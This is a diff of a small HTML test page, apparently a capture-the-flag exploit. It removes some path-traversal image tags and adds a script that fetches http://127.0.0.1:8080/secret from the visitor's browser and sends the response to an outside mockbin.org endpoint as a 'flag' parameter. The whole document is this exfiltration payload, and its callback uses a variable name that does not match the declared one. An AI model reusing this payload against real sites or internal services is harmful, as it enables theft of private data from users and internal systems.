@@ -3,12 +3,27 @@
   <head>
     <meta charset="utf-8">
     <title>test</title>
-    <link rel="stylesheet" href="./http:/styles.css">
   </head>
   <body>
-    <img src="http:/../../../../../flag">
-	<img src="./http:/b.png">
-	<img src="http:/b.png">
+  	
+    <script>
+    	var xmlHttp = null;
+	try {
+	    xmlHttp = new XMLHttpRequest();
+	} catch(e) {
+	}
+	if (xmlHttp) {
+	    xmlHttp.open('GET', 'http://127.0.0.1:8080/secret', true);
+	    xmlHttp.onreadystatechange = function () {
+		  if (xhttp.readyState == 4 ) { //&& xhttp.status == 200
+		  	var img = document.createElement('img');
+			img.src = "http://mockbin.org/bin/21c6f9aa-c551-4717-bc2c-b63516eb13ab?flag=" + xhttp.responseText;
+			document.body.appendChild(img);
+		  }
+	    };
+	    xmlHttp.send(null);
+	}
+    </script>
   </body>
 </html> 
  
